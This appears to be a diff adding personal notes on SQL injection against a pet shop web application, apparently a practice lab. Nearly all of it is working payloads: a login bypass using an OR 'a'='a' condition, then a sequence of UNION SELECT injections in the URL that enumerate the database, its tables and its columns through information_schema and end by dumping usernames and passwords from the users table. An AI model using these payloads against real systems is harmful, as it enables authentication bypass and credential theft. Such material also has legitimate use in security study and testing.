@@ -1,0 +1,56 @@
+----------------------------------------------------LOGIN PAGE-----------------------------------
+ username=qwerty
+password=qwerty
+
+password = anytext' OR 'a'='a
+
+
+========================================================================================================================================
+
+
+-------------------------------------------SHOPPING PAGE-------------------------------------------
+
+IN THE URL FIELD
+
+' UNION SELECT usernames, passwords FROM users --+
+
+=----------------------------------we'll not always know table names and column names---------------------
+-----------------------------------so we use UNION to findout table names and column names-----------
+
+                              UNION SYNTAX =  query1 UNION query2;
+
+------------------------------------rule of union the number of columns should be same in both queries-----------------------
+
+-----------------------------------so we need to find the number of columns in the first query---------------------
+
+
+----------------------------------------we can see 2 columns on the website price and names so we assume 2 columns are fetched in first query-----------------
+
+' UNION SELECT database(),database() --+
+ 
+---------------------------dbname='petshopdb'-------------------------
+
+' UNION SELECT TABLE_NAME, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'petshopdb' --+
+
+---------------------tables in the petshopdb = pets, users--------------------
+
+' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name= 'pets' --+
+
+----------------------columns in table pets = type, name, price--------------------------- 
+
+' UNION SELECT type, name FROM users --+
+' UNION SELECT name,price FROM users --+
+
+------------------------------no useful details---------------------------------
+
+
+' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name= 'users' --+
+
+
+------------------------------columns in table users = slno, usernames, passwords-----------------------------
+
+
+' UNION SELECT usernames, passwords FROM users --+
+
+
+--------------------------------------important details--------------------------------
